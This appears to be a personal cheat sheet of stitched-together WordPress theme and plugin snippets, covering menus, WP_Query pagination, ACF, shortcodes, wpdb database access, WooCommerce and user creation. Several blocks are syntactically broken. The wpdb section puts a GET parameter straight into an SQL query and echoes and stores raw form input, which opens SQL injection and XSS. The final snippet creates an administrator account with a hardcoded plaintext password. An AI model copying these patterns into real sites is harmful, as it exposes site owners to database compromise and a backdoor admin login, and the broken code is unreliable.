<?php
/*
Theme Name:
Theme URI: https://.com
Author: Shakir Ahmad
Author URI: https://shakir.nixsit.com
Description:
Version: 0.0.1
License: GNU General Public License v2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html
Text Domain:
Tags: one-column, two-columns, right-sidebar, flexible-header, accessibility-ready, custom-colors, custom-header, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, post-formats, rtl-language-support, sticky-post, theme-options, threaded-comments, translation-ready
*/
?>

<html <?php language_attributes(); ?>>
<meta charset="<?php bloginfo( 'charset' ); ?>">

<?php wp_head(); ?>
</head>

<body <?php body_class(); ?>>

<div <?php post_class(); ?>>

	<?php wp_footer(); ?>
</body>

<?php echo esc_url( get_template_directory_uri() ); ?>

<?php
function alpha_bootstrapping()
{

    load_theme_textdomain('alpha', get_template_directory() . '/languages');

    add_theme_support('title-tag');
    add_theme_support('post-thumbnails');
    if (has_post_thumbnail()) {
        the_post_thumbnail();
    }

    add_theme_support('html5', array('comment-list', 'comment-form', 'search-form', 'gallery', 'caption'));
    add_theme_support('custom-background');

    add_theme_support('post-formats', array('aside', 'gallery', 'link', 'image', 'quote', 'status', 'video', 'audio', 'chat'));
    // add post-formats to post_type 'page'
    add_post_type_support('page', 'post-formats');
    // add post-formats to post_type 'my_custom_post_type'
    add_post_type_support('my_custom_post_type', 'post-formats');
    if (has_post_format('quote')) {
        echo 'This is a quote.';
    }

    add_theme_support('custom-header-uploads');
    add_theme_support('responsive-embeds');
    add_theme_support('starter-content');
    add_theme_support('automatic-feed-links');
    add_theme_support('customize-selective-refresh-widgets');


    add_theme_support('custom-header', array(
        'default-image' => get_template_directory_uri() . 'img/default-image.jpg', ,
        'random-default' => false,
        'width' => 100,
        'height' => 80,
        'flex-height' => true,
        'flex-width' => true,
        'default-text-color' => '000',
        'header-text' => true,
        'uploads' => true,
        'wp-head-callback' => '',
        'admin-head-callback' => '',
        'admin-preview-callback' => '',
        'video' => false,
        'video-active-callback' => 'is_front_page',
    ));

    echo header_image();

    OR

    if (get_header_image()) : ?>
<div id="site-header">
    <a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home">
        <img src="<?php header_image(); ?>" width="<?php echo absint( get_custom_header()->width ); ?>"
             height="<?php echo absint( get_custom_header()->height ); ?>"
             alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>">
    </a>
</div>
<?php endif;

add_theme_support( 'custom-logo', array(
	'height'      => 100,
	'width'       => 400,
	'flex-height' => true,
	'flex-width'  => true,
	'header-text' => array( 'site-title', 'site-description' ),
) );
if ( function_exists( 'the_custom_logo' ) ) {
	the_custom_logo();
}

register_nav_menus(
	array(
		'header-menu' => __( 'Header Menu', 'alpha' ),
		'extra-menu'  => __( 'Extra Menu', 'alpha' )
	)
);
wp_nav_menu( array(
	'theme_location'  => 'extra-menu',
	'menu'            => '',
	'menu_class'      => '',
	'menu_id'         => '',
	'container'       => '',
	'container_class' => '',
	'container_id'    => '',
	'fallback_cb'     => 'wp_page_menu',
	'before'          => '',
	'after'           => '',
	'link_before'     => '',
	'link_after'      => '',
	'echo'            => true,
	'items_wrap'      => '<ul id="%1$s" class="%2$s">%3$s</ul>',
	'item_spacing'    => 'preserve',
	'depth'           => 0,
	'walker'          => '',
) );
wp_nav_menu( array $args = array(
	'menu'            => '',
	// (int|string|WP_Term) Desired menu. Accepts a menu ID, slug, name, or object.
	'menu_class'      => '',
	// (string) CSS class to use for the ul element which forms the menu. Default 'menu'.
	'menu_id'         => '',
	// (string) The ID that is applied to the ul element which forms the menu. Default is the menu slug, incremented.
	'container'       => '',
	// (string) Whether to wrap the ul, and what to wrap it with. Default 'div'.
	'container_class' => '',
	// (string) Class that is applied to the container. Default 'menu-{menu slug}-container'.
	'container_id'    => '',
	// (string) The ID that is applied to the container.
	'fallback_cb'     => '',
	// (callable|bool) If the menu doesn't exists, a callback function will fire. Default is 'wp_page_menu'. Set to false for no fallback.
	'before'          => '',
	// (string) Text before the link markup.
	'after'           => '',
	// (string) Text after the link markup.
	'link_before'     => '',
	// (string) Text before the link text.
	'link_after'      => '',
	// (string) Text after the link text.
	'echo'            => '',
	// (bool) Whether to echo the menu or return it. Default true.
	'depth'           => '',
	// (int) How many levels of the hierarchy are to be included. 0 means all. Default 0.
	'walker'          => '',
	// (object) Instance of a custom walker class.
	'theme_location'  => '',
	// (string) Theme location to be used. Must be registered with register_nav_menu() in order to be selectable by the user.
	'items_wrap'      => '',
	// (string) How the list items should be wrapped. Default is a ul with an id and class. Uses printf() format with numbered placeholders.
	'item_spacing'    => ''
	// (string) Whether to preserve whitespace within the menu's HTML. Accepts 'preserve' or 'discard'. Default 'preserve'.
)
);

}

add_action( "after_setup_theme", "alpha_bootstrapping" );
?>

<?php
// adding class to a tag
function anchor_link_class( $atts, $item, $args ) {
	$class         = 'page-scroll';
	$atts['class'] = $class;

	return $atts;
}

add_filter( 'nav_menu_link_attributes', 'anchor_link_class', 10, 3 );

// adding class to li tag
function my_class( $classes, $item ) {
	$classes[] = 'page-scroll';

	return $classes;
}

add_filter( 'nav_menu_css_class', 'my_class', 10, 2 );

?>


<?php bloginfo( 'name' ); ?>
<a href="<?php echo esc_url( home_url( '/' ) ); ?>"><?php bloginfo( 'name' ); ?></a>
<?php bloginfo( 'description' ); ?>

<?php the_title(); ?>
<a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
<?php the_author(); ?>
<?php echo get_the_date( 'jS F, Y' ); ?>

<?php echo get_the_tag_list( '<ul class="list-unstyled"><li>', '</li><li>', '</li></ul>' ); ?>

<?php if ( has_post_thumbnail() ) {
	the_post_thumbnail( 'large', array( 'class' => 'img-fluid"' ) );
}; ?>

<?php the_content(); ?>
<?php the_excerpt(); ?>

<?php
if ( is_single() ) {
	the_content();
} else {
	the_excerpt();
}
?>

<?php

next_posts_link( 'Older posts' );
previous_posts_link( 'Newer posts' );

the_posts_pagination( array(
	'mid_size'           => 2,
	'prev_text'          => _x( 'New Posts', 'previous set of posts' ),
	'next_text'          => _x( 'Old Posts', 'next set of posts' ),
	'screen_reader_text' => __( ' ' )
) );

?>

<?php if (comments_open()): ?>
<div class="col-md-10 offset-md-1">
	<?php
	comments_template();
	?>
</div>
<?php endif; ?>

<?php get_header(); ?>
<?php get_footer(); ?>
<?php get_template_part( 'hero' ); ?>

<?php
next_post_link();
echo '<br>';
previous_post_link();
?>

<?php
function alpha_sidebar() {
	register_sidebar( array(
		'name'          => __( 'Single Post Sidebar', 'alpha' ),
		'id'            => 'primary',
		'description'   => __( 'Right Sidebar', 'alpha' ),
		'class'         => '',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}

add_action( 'widgets_init', 'alpha_sidebar' );

if ( is_active_sidebar( 'primary' ) ) {
	dynamic_sidebar( 'primary' );
}
?>

<?php
if ( ! post_password_required() ) {
	the_excerpt();
} else {
	echo get_the_password_form();
}
?>

<?php
if ( post_password_required() ) {
	echo 'This post is password protected' . get_the_password_form();
} else {
	the_excerpt();
}
?>

<?php
function alpha_the_excerpt( $excerpt ) {
	if ( ! post_password_required() ) {
		return $excerpt;
	} else {
		echo get_the_password_form();
	}
}

add_filter( 'the_excerpt', 'alpha_the_excerpt' );
?>

<?php
function alpha_protected_title_change() {
	return '%s';
}

add_filter( 'protected_title_format', 'alpha_protected_title_change' );
?>

<?php
register_nav_menus( array(
	'topmenu'    => __( 'Top Menu', 'alpha' ),
	'footermenu' => __( 'Footer Menu', 'alpha' ),
) );
?>

<?php
wp_nav_menu( array(
	'theme_location' => 'topmenu',
	'menu_id'        => 'topmenucontainer',
	'menu_class'     => 'list-inline text-center'
) );
?>

<?php

if ( site_url() == 'http://localhost/lwhh.com' ) {
	define( 'VERSION', time() );
} else {
	define( 'VERSION', wp_get_theme()->get( 'Version' ) );
}

function alpha_assets() {
	wp_enqueue_style( 'featherlight-css', '//cdn.rawgit.com/noelboss/featherlight/1.7.13/release/featherlight.min.css' );
	wp_enqueue_style( 'bootstrap', '//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css' );
	wp_enqueue_style( 'style', get_stylesheet_uri(), null, VERSION );

	wp_enqueue_script( 'featherlight-js', '//cdn.rawgit.com/noelboss/featherlight/1.7.13/release/featherlight.min.js', array( 'jquery' ), '0.0.1', true );
	wp_enqueue_script( 'alpha-main', get_theme_file_uri( '/assets/js/main.js' ), array(
		'jquery',
		'featherlight-js'
	), VERSION, true );
}

add_action( 'wp_enqueue_scripts', 'alpha_assets' );
?>

#!/usr/bin/env php
<?php
foreach ( glob( "*.css" ) as $css ) {
	echo "wp_enqueue_style( 'wptheme-{$css}', get_template_directory_uri() . '/css/{$css}', null, '1.0' );\n";
}
?>
#!/usr/bin/env php
<?php
foreach ( glob( "*.js" ) as $js ) {
	echo "wp_enqueue_script( 'wptheme-{$js}', get_template_directory_uri() . '/js/{$js}', array('jquery'), '1.0', true );\n";
}
?>


<?php
// Google Map API Key
//1. Go to https://console.cloud.google.com
//2. Click on APIs & Services >> Credentials >> Create credentials >> API key >> Restrict kye
//3. Name it as your choich
//4. Select the HTTP referrers (web sites)
//5. Keep your Homepage URL and save it.
//6. copy the key and replace
?>
<?php
if ( has_post_thumbnail() ) {
	$thumbnail_url = get_the_post_thumbnail_url( null, 'large' );
	echo '<a href="' . $thumbnail_url . '" data-featherlight="image">';
	the_post_thumbnail( 'large', array( 'class' => 'img-fluid"' ) );
	echo '</a>';
};
?>

<?php
if ( has_post_thumbnail() ) {
	$thumbnail_url = get_the_post_thumbnail_url( null, 'large' );
	printf( '<a href="%s" data-featherlight="image">', $thumbnail_url );
	the_post_thumbnail( 'large', array( 'class' => 'img-fluid"' ) );
	echo '</a>';
};
?>

// OR

<?php
if ( has_post_thumbnail() ) {
	echo '<a class="popup" href="" data-featherlight="image">';
	the_post_thumbnail( 'large', array( 'class' => 'img-fluid"' ) );
	echo '</a>';
};
?>

<script>
    ;(function ($) {
        $(document).ready(function () {
            $(".popup").each(function () {
                var image = $(this).find('img').attr('src');
                $(this).attr('href', image);
            });
        });
    })(jQuery);
</script>


<?php

$alpha_feat_image = get_the_post_thumbnail_url( null, 'large' );
?>
<div class="header page-header" style="background-image: url(<?php echo $alpha_feat_image; ?>)">

    OR

	<?php
	function alpha_about_page_template_banner() {

		if ( is_page() ) {
			$alpha_feat_image = get_the_post_thumbnail_url( null, 'large' );
			?>
            <style>
                .page-header {
                    background-image: url('<?php echo $alpha_feat_image; ?>');
                }
            </style>
			<?php
		}

		if ( is_front_page() ) {
			if ( current_theme_supports( 'custom-header' ) ) {
				?>
                <style>
                    .header {
                        background-image: url(<?php echo header_image(); ?>);
                    }

                    .header h1.heading a, h3.tagline {
                        color: #<?php echo get_header_textcolor(); ?>;
                    <?php
					if(!display_header_text()){
						echo "display: none";
					}
					?>
                    }
                </style>
				<?php
			}
		}

	}

	add_action( 'wp_head', 'alpha_about_page_template_banner', 11 );
	?>

	<?php if ( current_theme_supports( 'custom-logo' ) ): ?>
        <div class="header-logo text-center">
			<?php the_custom_logo(); ?>
        </div>
	<?php endif; ?>


	<?php
	$placeholder_text = get_post_meta( get_the_ID(), 'placeholder', true );
	$hint             = get_post_meta( get_the_ID(), 'hint', true );
	?>

	<?php echo esc_attr( $placeholder_text ); ?>
	<?php echo esc_html( $hint ); ?>

    /**********************
    ** Custom Post Query **
    ***********************/
	<?php

	$_p = get_posts( array(
		'post__in' => array( 30, 7, 36 ), // Post ID
		'order'    => 'asc'
	) );

	$_p = get_posts( array(
		'post__in'       => array( 30, 7, 36 ), // Post ID
		'orderby'        => 'post__in',
		'posts_per_page' => 2,
	) );

	foreach ( $_p as $post ) {
		setup_postdata( $post );
		?>
        <h2><?php the_title(); ?></h2>
		<?php
	}
	wp_reset_postdata();
	?>
    /***************************
    ** Custom Post Pagination **
    ****************************/
	<?php
	$paged          = get_query_var( "paged" ) ? get_query_var( "paged" ) : 1;
	$posts_per_page = 2;
	$total          = 9;
	$post_ids       = array( 30, 7, 36 );
	$_p             = get_posts( array(
//	'post__in'       => $post_ids,
		'author__in'     => array( 1 ),
		'numberposts'    => $total,
		'orderby'        => 'post__in',
		'posts_per_page' => 2,
		'paged'          => $paged,
	) );

	foreach ( $_p as $post ) {
		setup_postdata( $post );
		?>
        <h2><?php the_title(); ?></h2>
		<?php
	}
	wp_reset_postdata();
	?>

    <div class="container post-pagination">
        <div class="row">
            <div class="col-md-4"></div>
            <div class="col-md-8">
				<?php
				echo paginate_links( array(
//					'total' => ceil( count( $post_ids ) / $posts_per_page )
					'total' => ceil( $total / $posts_per_page )
				) );
				?>
            </div>
        </div>
    </div>
    /******************************
    ** WP_Query Class Pagination **
    *******************************/
	<?php
	$paged          = get_query_var( "paged" ) ? get_query_var( "paged" ) : 1;
	$posts_per_page = 2;
	$total          = 9;
	$post_ids       = array( 30, 7, 36 );
	$_p             = new WP_Query( array(
//	'author__in'     => array( 1 ),
//	'numberposts'    => $total,
//	'orderby'        => 'post__in',
//	'posts_per_page' => 2,
//	'paged'          => $paged,
		'category_name'  => 'uncategorized',
		'posts_per_page' => $posts_per_page,
		'paged'          => $paged,
	) );

	while ( $_p->have_Posts() ) {
		$_p->the_post();
		?>
        <h2 class="text-center"><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h2>
		<?php
	}
	wp_reset_query();
	?>

    <div class="container post-pagination">
        <div class="row">
            <div class="col-md-4"></div>
            <div class="col-md-8">
				<?php
				echo paginate_links( array(
					'total'     => $_p->max_num_pages,
					'current'   => $paged,
					'prev_next' => false,
				) );
				?>
            </div>
        </div>
    </div>
    /******************************
    ** WP_Query Class Pagination **
    *******************************/

    /******************************************
    ** WP_Query Class Relationship & Joining **
    *******************************************/
	<?php
	$paged          = get_query_var( "paged" ) ? get_query_var( "paged" ) : 1;
	$posts_per_page = 2;
	$total          = 9;
	$post_ids       = array( 30, 7, 36 );
	$_p             = new WP_Query( array(
		'posts_per_page' => $posts_per_page,
		'paged'          => $paged,
		'tax_query'      => array(
			'relation' => 'OR',
			array(
				'taxonomy' => 'category',
				'field'    => 'slug',
				'terms'    => array( 'new' )
			),
			array(
				'taxonomy' => 'post_tag',
				'field'    => 'slug',
				'terms'    => array( 'special' )
			)
		)
	) );

	while ( $_p->have_posts() ) {
		$_p->the_post();
		?>
        <h2 class="text-center"><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h2>
		<?php
	}
	wp_reset_query();
	?>

    <div class="container post-pagination">
        <div class="row">
            <div class="col-md-4"></div>
            <div class="col-md-8">
				<?php
				echo paginate_links( array(
					'total'     => $_p->max_num_pages,
					'current'   => $paged,
					'prev_next' => false,
				) );
				?>
            </div>
        </div>
    </div>
    /***************************************
    ** WP_Query - Search With Date & Post **
    ****************************************/
	<?php
	$paged          = get_query_var( "paged" ) ? get_query_var( "paged" ) : 1;
	$posts_per_page = 2;
	$total          = 9;
	$post_ids       = array( 30, 7, 36 );
	$_p             = new WP_Query( array(
		'monthnum'    => 6,
		'year'        => 2018,
		'post_status' => 'draft',
	) );

	while ( $_p->have_posts() ) {
		$_p->the_post();
		?>
        <h2 class="text-center"><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h2>
		<?php
	}
	wp_reset_query();
	?>

    <div class="container post-pagination">
        <div class="row">
            <div class="col-md-4"></div>
            <div class="col-md-8">
				<?php
				echo paginate_links( array(
					'total'     => $_p->max_num_pages,
					'current'   => $paged,
					'prev_next' => false,
				) );
				?>
            </div>
        </div>
    </div>

    /***********************************
    ** Introduction Metabox Framework **
    ************************************/
    https://www.advancedcustomfields.com/
    https://github.com/CMB2/CMB2/
    http://codestarframework.com/
    http://www.titanframework.net/

    /********************************************************
    ** ACF installation with TGM plugin activation library **
    *********************************************************/
    http://tgmpluginactivation.com/
    1. Download TGM Plugin
    2. copy the file (class-tgm-plugin-activation.php) to lib folder
    3. copy the file (example.php) to inc folder and name it tgm.php
    4. change in tgm.php

	<?php
	require_once get_theme_file_path( '/lib/class-tgm-plugin-activation.php' );
	$plugins = array(
		array(
			'name'     => 'ACF',
			'slug'     => 'advanced-custom-fields',
			'required' => false,
		),
	);
	?>

    5. add in functions.php
	<?php require_once get_theme_file_path( '/inc/tgm.php' ); ?>

    6. add in functions.php for ACF updated plugin
	<?php define( 'ACF_EARLY_ACCESS', '5' ); ?>

    /***********************************
    ** Display Data in ACF Meta field **
    ************************************/
	<?php
	if ( get_post_format() == "image" && function_exists( "the_field" ) ):
		?>
        <div class="metainfo">

            <strong>Camera Model: </strong><?php the_field( "camera_model" ); ?>
            <br>

            <strong>Location: </strong>
			<?php
			$alpha_location = get_field( "location" );
			echo esc_html( $alpha_location );
			?>
            <br>

            <strong>Date: </strong><?php the_field( "date" ); ?><br>
            <strong>Camera Model: </strong><?php the_field( "camera_model" ); ?>
            <br>
			<?php if ( get_field( "licensed" ) ): ?>
				<?php echo apply_filters( "the_content", get_field( "license_information" ) ); ?>
			<?php endif; ?>

        </div>
	<?php endif; ?>

    /********************
    ** ACF Image field **
    *********************/
	<?php
	$alpha_image         = get_field( "image" );
	$alpha_image_details = wp_get_attachment_image_src( $alpha_image, "alpha-square" );
	echo "<img src=" . esc_url( $alpha_image_details[0] ) . ">";
	?>


    /*******************************
    ** Custom Post With Shortcode **
    ********************************/
    // Image Gallery Custom Post Type Function
	<?php
	function shakir_image_gallery() {
		register_post_type( 'shakir_gallery',
			array(
				'labels'        => array(
					'name' => __( 'Image Gallery' ),
				),
				'public'        => true,
				'menu_position' => 20,
				'supports'      => array( 'title', 'thumbnail' )
			)
		);
	}

	// Hooking up custom post type function to theme
	add_action( 'init', 'shakir_image_gallery' );

	function shakir_image() {
	echo '
    <div class="image-with-text">
        <div class="container">
            <div class="row">'
	?>
	<?php
	$loop = new WP_Query( array(
		'post_type'      => 'shakir_gallery',
		'posts_per_page' => 4
	) );
	while ( $loop->have_posts() ) {
		$loop->the_post();
		$image_gallery_link_one = get_post_meta( get_the_ID(), 'image_gallery_link_one', true );
		$page_thumb             = wp_get_attachment_image_src( get_post_thumbnail_id( get_the_ID() ), 'full' );
		?>

        <div class="col-lg-6 d-flex justify-content-center">
            <div class="background-image" style="background-image:url('<?php echo $page_thumb[0]; ?>');">
                <a href="'<?php echo $image_gallery_link_one; ?>'">
                    <h3><?php the_title(); ?></h3>
                </a>
            </div>
        </div>

	<?php } ?>
</div>
</div>
</div>
<?php

}
add_shortcode( 'shakir', 'shakir_image' );



/*******************************
 ** Custom Post With Shortcode **
 ********************************/
// Image Gallery Custom Post Type Function
function shakir_image_gallery() {
	register_post_type(
		'shakir_gallery',
		array(
			'labels'        => array(
				'name' => __( 'Image Gallery' ),
			),
			'public'        => true,
			'menu_position' => 20,
			'supports'      => array( 'title', 'editor', 'thumbnail', 'custom-fields' )
		)
	);
}
add_action( 'init', 'shakir_image_gallery' );

// Image Gallery Shortcode
function shakir_image() {
	$loop = new WP_Query( array(
		'post_type'      => 'shakir_gallery',
		'orderby'        => 'rand',
		'posts_per_page' => - 1,
	) );

	if ( $loop->have_posts() ) {

		$output = '<section class="image-gallery"><div class="container"><div class="row">';
		while ( $loop->have_posts() ) {
			$loop->the_post();
			$image_gallery_link = get_post_meta( get_the_ID(), 'image_gallery_link', true );

			$output .= '
                                <div class="col-lg-3 d-flex justify-content-center mb-5">
					<div class="card" style="width: 18rem;">
                                        	<a href="' . $image_gallery_link . '">      
							' . get_the_post_thumbnail( null, "large", "array(\"class\"=>\"card-img-top\")" ) . '
                                        	</a>
						<div class="card-body">
							<h5 class="card-title text-center">
								<a href="' . $image_gallery_link . '"> 
									' . get_the_title() . '
								</a>
                                        		</h5>
							<p class="card-text">
                                        			' . get_the_content() . '
							</p>
						</div>
                                        </div>
                                </div>';
		}
		$output .= '</div></div></section>';
	} else {
		$output = "Content Not Added.";
	}

	return $output;
}
add_shortcode( 'beachesliving_random_image_gallery', 'shakir_image' );
?>


<!-- Preloader -->
<!--HTML-->
<div class="loader">
    <div class="spinner"></div>
</div>


<!--CSS-->
<style>
    .loader {
        position: fixed;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #525252;
        width: 100%;
        height: 100%;
        z-index: 99999;
    }

    .spinner {
        width: 40px;
        height: 40px;
        border: 5px solid #fff;
        border-radius: 100%;
        margin: 50vh auto;
        transform: translateY(-50%);
        position: relative;
    }

    .spinner:after {
        content: "";
        position: absolute;
        top: -5px;
        left: -5px;
        width: 40px;
        height: 40px;
        border: 5px solid transparent;
        border-top: 5px solid #00aff0;
        border-radius: 100%;
        transform: rotate(45deg);
        animation: wheel 1s ease-in-out infinite;
    }

    @keyframes wheel {
        from {
            transform: rotate(45deg);
        }
        to {
            transform: rotate(405deg)
        }
    }
</style>


<!--jQuery-->
<script>
    (function ($) {

        $(window).on('load', function () {
            $('.loader').fadeOut();
        });

    })(jQuery);
</script>


<!--jQuery-->
<script>
    (function ($) {

// Write Code

    })(jQuery);

    jQuery(document).ready(function ($) {

// Write Code

    });
</script>


/*********************
***** WPDB START *****
**********************/
<?php
// Create Table
function theme_database() {
	global $wpdb;
	$prefix = $wpdb->prefix;
	$table  = $prefix . 'sujan';
	require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
	dbDelta( "CREATE TABLE $table(id INT AUTO_INCREMENT, name varchar( 250 ), UNIQUE KEY id( id ) )" );
}
add_action( 'after_setup_theme', 'theme_database' );

//Read Single Value // Write below code in the page template or where you want to show
global $wpdb;
$prefix = $wpdb->prefix;
$usertable = $prefix . 'users';
echo $wpdb->get_var( "SELECT user_login FROM $usertable WHERE id = 1", 2, 1 );

//Read Multiple Value // Write below code in the page template or where you want to show
global $wpdb;
$prefix = $wpdb->prefix;
$userposts = $prefix . 'posts';
$posts = $wpdb->get_results( "SELECT * FROM $userposts WHERE post_type = 'post' and post_status = 'publish'", OBJECT_K );
foreach ( $posts as $post ) {
	echo $post->post_title . "<br>";
}
?>

/***********************
***** Insert Value *****
************************/
<form action="" method="post">
    <input type="text" name="name" placeholder="Please type your name">
    <input type="submit" value="submit" name="namesubmit">
</form>

<?php
// Write below code in functions.php
function theme_database() {
	global $wpdb;
	$prefix = $wpdb->prefix;
	$table  = $prefix . 'sujan';
	require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
	dbDelta( "CREATE TABLE $table(id INT AUTO_INCREMENT, name varchar( 250 ), UNIQUE KEY id( id ) )" );
}
add_action( 'after_setup_theme', 'theme_database' );


// Form Data Insert
if ( isset( $_POST['namesubmit'] ) ) {
	$tablename = $wpdb->prefix . 'sujan';
	$name      = $_POST['name'];
	$wpdb->insert( $tablename, array(
		'name' => $name,
	) );
}
?>
/***********************
***** Update Value *****
************************/

// In Template
<?php
global $wpdb;
$tablename = $wpdb->prefix . 'sujan';
$infos = $wpdb->get_results( "SELECT * FROM $tablename" );
foreach ( $infos as $info ) {
	$id       = $info->id;
	$editlink = '?edit' . $id;
	echo $id . ' ' . $info->name . ' <a href="' . $editlink . '">edit</a>' . "<br>";
}

?>

<?php
if ( isset( $_GET['edit'] ) ) :

$id = $_GET['edit'];
$value = $wpdb->get_var( "SELECT name FROM $tablename WHERE id = $id" );
?>
<form action="" method="post">
    <input type="text" name="name" placeholder="Please type your name" value="<?php echo $value; ?>">
    <input type="submit" value="edit" name="nameupdate">
</form>
<?php endif; ?>

<?php
//In Database
$id = $_GET['edit'];
$tablename = $wpdb->prefix . 'sujan';
$data = $_POST['name'];
if ( isset( $_POST['nameupdate'] ) ) {

	$wpdb->replace( $tablename, array(
		'id'   => $id,
		'name' => $data
	) );
}
?>
/*******************
***** WPDB END *****
********************/

// Search Form
// Add the function to the template
<?php
if(is_search()){
?>
<h3>You searched for: <?php the_search_query(); ?></h3>
<?php
}
?>

<?php
if(! have_posts() && is_search()){
?>
<h4>
	<?php _e( 'No result found', 'textdomain' ); ?>
</h4>
<?php
}
?>

<?php echo get_search_form(); ?>

// Add below code to searchpage.php
<form role="search" method="get" id="searchform" action="<?php echo esc_url( home_url( '/' ) ); ?>">
    <div>
        <label for="s" class="screen-reader-text">Search for: </label>
        <input type="text" value="" name="s" id="s">
        <input type="submit" id="searchsubmit" value="Search">
    </div>
</form>


// Settings API
// Add below code to functions.php
<?php
    function menu_options()
    {
    add_settings_field('header_text', 'Header Text', 'ekhane_design_thakbe', 'general');
    register_setting('general', 'header_text');
    }

    add_action('admin_init', 'menu_options');

    function ekhane_design_thakbe()
    {
    echo '<input type="text" name="header_text" class="regular-text" value="' . get_option('header_text') . '">';
    }

    // Read data from template
    echo get_option('header_text');


// Dynamic Filtering like Mixitup Isotop Etc
function theme_custom_post()
{
    register_post_type('products', array(
        'labels' => array(
            'name' => 'Products',
            'menu_name' => 'Products',
            'all_items' => 'All Products',
            'add_new' => 'Add New Product',
            'add_new_item' => 'Add New Product',
        ),
        'public' => true,
        'supports' => array(
            'title', 'revisions', 'page-attributes', 'thumbnail', 'editor'
        )
    ));

    register_taxonomy('product_category', 'products', array(
        'labels' => array(
            'name' => 'Product Categories',
            'add_new_item' => 'Add New Category'
        ),
        'hierarchical' => true,
        'show_admin_column' => true
    ));

}

add_action('init', 'theme_custom_post');


//2. for menu or button
<div class="filter-button">
    <ul data-filter-group="color">
        <?php
        $all_categories = get_terms('product_category', array(
            'hide_empty' => false,
            'order' => 'desc',
        ));
        foreach ($all_categories as $single_category) {
            echo '<li><button class="button" data-filter=".' . $single_category->slug . '"><i class="fas fa-bolt"></i>' . $single_category->name . '</button></li>';
        }
        ?>
</ul>
</div>

// 3. for post
<div class="post-section">
    <div class="container">
        <div class="row grid">
			<?php
			$product_post = null;
			$product_post = new WP_Query( array(
				'post_type'      => 'products',
				'posts_per_page' => - 1,
			) );
			if ( $product_post->have_posts() ) {
				while ( $product_post->have_posts() ) {
					$product_post->the_post();
					$product_terms = get_the_terms( get_the_ID(), 'product_category' );
					?>
                    <div class="col-md-4 item <?php foreach ( $product_terms as $product_term ) {
						echo $product_term->slug . ' ';
					} ?>">
                        <div class="single-post">
                            <h5 class="post-heading">
                                <a href="<?php the_permalink(); ?>">
									<?php the_title(); ?>
                                </a>
                            </h5>
                            <div class="thumbnail">
                                <a href=""><?php the_post_thumbnail(); ?></a>
                                <div class="social">
                                    <a href="" class="save">Save</a>
                                    <a href=""><i class="fab fa-facebook-f"></i></a>
                                    <a href=""><i class="fab fa-twitter"></i></a>
                                    <a href=""><i class="fab fa-pinterest"></i></a>
                                </div>
                            </div>
							<?php the_content(); ?>
                            <div class="row">
                                <div class="col-md-7">
                                    <h4>$166.44</h4>
                                    <span class="love"><i class="fas fa-heart"></i>4 saves</span>
                                    <span class="views"><i class="fas fa-eye"></i>4451 views</span>
                                </div>
                                <div class="col-md-5">
                                    <a href="" class="btn-check">Check it out</a>
                                </div>
                            </div>
                        </div>
                    </div>
					<?php
				}
			} else {
				echo "No Posts";
			}
			?>

        </div>
    </div>
</div>


// Dynamic Share Buttons
// Google Search Keyword "wordpress facebook share link"
<a href="http://www.facebook.com/sharer.php?url=<?php the_permalink(); ?>&amp;t=<?php the_title(); ?>"
   target="_blank"></a>
<a href="http://twitter.com/home/?status=<?php the_title(); ?> - <?php the_permalink(); ?>" target="_blank"></a>
<a href="https://plus.google.com/share?url=<?php the_permalink(); ?>" target="_blank"></a>
<a href="http://www.linkedin.com/shareArticle?mini=true&amp;title=<?php the_title(); ?>&amp;url=<?php the_permalink(); ?>"
   target="_blank"></a>


// Redux Framework

// 1. Keep folder "ReduxCore", "sample",
// 2. Keep File "class.redux-plugin.php", "index.php", "redux-framework.php"
// include below files in to functions.php and write code to barebones-config.php
<?php
include_once( 'lib/redux/redux-framework.php' );
include_once( 'lib/redux/sample/barebones-config.php' );


/***********************
 ***** WooCommerce *****
 ************************/
// To remove anything From anything write in functions.php
remove_action( '', '', '' );

// To change
add_filter( 'woocommerce_short_description', 'ts_woocommerce_short_description' );
function ts_woocommerce_short_description( $desc ) {
	return strtoupper( $desc );
}

/*******************************
 ***** WooCommerce Support *****
 *******************************/
function ecom_woocommerce_support() {
	add_theme_support( 'woocommerce' );
}
add_action( 'after_setup_theme', 'ecom_woocommerce_support' );
?>
// Duplicate page.php to woocommerce.php
// delete default WordPress Loop and write the function <?php woocommerce_content(); ?>


/*****************************
***** Plugin Development *****
******************************/

/************************
***** User Creation *****
*************************/
<?php
$user_login = 'moonlux';
$user_pass  = 'gulugulu';
$user_email = 'moonluxa@gmail.com';
$role       = 'administrator';
wp_insert_user(array(
'user_login' => $user_login,
'user_pass' => $user_pass,
'user_email' => $user_email,
'role' => $role,
));
?>
